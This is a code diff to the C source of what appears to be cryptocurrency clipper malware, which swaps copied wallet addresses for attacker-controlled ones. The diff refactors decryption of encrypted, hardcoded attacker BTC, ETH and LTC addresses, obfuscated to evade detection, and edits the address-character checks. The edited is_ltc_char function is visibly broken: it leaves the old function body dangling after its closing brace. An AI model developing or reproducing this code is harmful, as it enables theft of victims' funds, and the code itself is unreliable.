@@ -1,14 +1,24 @@
 #include "clipper.h"
 #include "config.h"
+#include "enc_strings.h"
 #include <string.h>
 
 #ifdef ENABLE_CLIPPER
 #include <ctype.h>
 
-/* Hardcoded attacker addresses */
-static char btc_addr[64] = {0}; static int btc_init = 0; if (!btc_init) { enc_decrypt(enc_btc_addr, ENC_BTC_ADDR_LEN, btc_addr); btc_init = 1; }
-static char eth_addr[64] = {0}; static int eth_init = 0; if (!eth_init) { enc_decrypt(enc_eth_addr, ENC_ETH_ADDR_LEN, eth_addr); eth_init = 1; }
-static char ltc_addr[64] = {0}; static int ltc_init = 0; if (!ltc_init) { enc_decrypt(enc_ltc_addr, ENC_LTC_ADDR_LEN, ltc_addr); ltc_init = 1; }
+/* Hardcoded attacker addresses — encrypted at build time */
+static char btc_addr[64] = {0};
+static char eth_addr[64] = {0};
+static char ltc_addr[64] = {0};
+static int clipper_addrs_init = 0;
+
+static void clipper_ensure_addrs(void) {
+    if (clipper_addrs_init) return;
+    enc_decrypt(enc_btc_addr, ENC_BTC_ADDR_LEN, btc_addr);
+    enc_decrypt(enc_eth_addr, ENC_ETH_ADDR_LEN, eth_addr);
+    enc_decrypt(enc_ltc_addr, ENC_LTC_ADDR_LEN, ltc_addr);
+    clipper_addrs_init = 1;
+}
 
 static int is_btc_char(char c) {
     return (c >= 'A' && c <= 'H') || (c >= 'J' && c <= 'N') ||
@@ -17,6 +27,9 @@ static int is_btc_char(char c) {
 }
 
 static int is_ltc_char(char c) {
+    /* LTC uses Base58 (same as BTC chars) plus '0' and 'O' for bech32 */
+    return is_btc_char(c) || c == '0' || c == 'O';
+}
     /* LTC uses Base58 (same as BTC chars) plus '0' and 'O' for bech32 */
     return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '2' && c <= '9') || c == '0';
